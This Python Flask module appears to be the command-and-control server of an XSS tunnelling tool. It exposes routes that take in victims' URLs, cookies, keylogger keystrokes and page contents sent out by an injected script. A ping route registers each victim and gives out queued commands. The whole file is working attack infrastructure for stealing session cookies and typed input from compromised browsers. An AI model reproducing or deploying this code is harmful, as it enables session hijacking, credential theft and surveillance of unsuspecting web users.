from xss_tunnel_server import app, command_store, victim_store
from xss_tunnel_server.model.victim import Victim
from xss_tunnel_server.model.shell_command import ShellCommand
from flask import jsonify, request, Response


@app.route('/receiveUrl/<victim_id>', methods=['POST'])
def receive_url(victim_id):
    report_back(victim_id, ShellCommand(victim_id, 'getUrl', request.data))

    return Response(status=200)


@app.route('/receiveCookies/<victim_id>', methods=['POST'])
def receive_cookies(victim_id):
    report_back(victim_id, ShellCommand(victim_id, 'getCookies', request.data))

    return Response(status=200)


@app.route('/receiveKeys/<victim_id>', methods=['POST'])
def receive_keys(victim_id):
    report_back(victim_id, ShellCommand(victim_id, 'stopLogger', request.data.replace('undefined', '')))

    return Response(status=200)


@app.route('/receiveSite/<victim_id>', methods=['POST'])
def receive_site(victim_id):
    victim = victim_store.get_victim(victim_id)
    if victim:
        site = request.data.replace('<script src="/static/js/hack.js"></script>', '')
        victim.current_page = site

    return Response(status=200)


@app.route('/ping/<victim_id>', methods=['GET'])
def ping(victim_id):
    if not victim_store.has_victim(victim_id):
        victim_store.add_victim(victim_id, Victim(victim_id, request))

    victim = victim_store.get_victim(victim_id)
    victim.update_last_seen()

    if victim.has_commands():
        command = victim.poll_commands()

        return jsonify(command=command['command'], metadata=command['metadata'])

    return 'ntp'


def report_back(victim_id, command):
    command_store.add_command(victim_id, command)
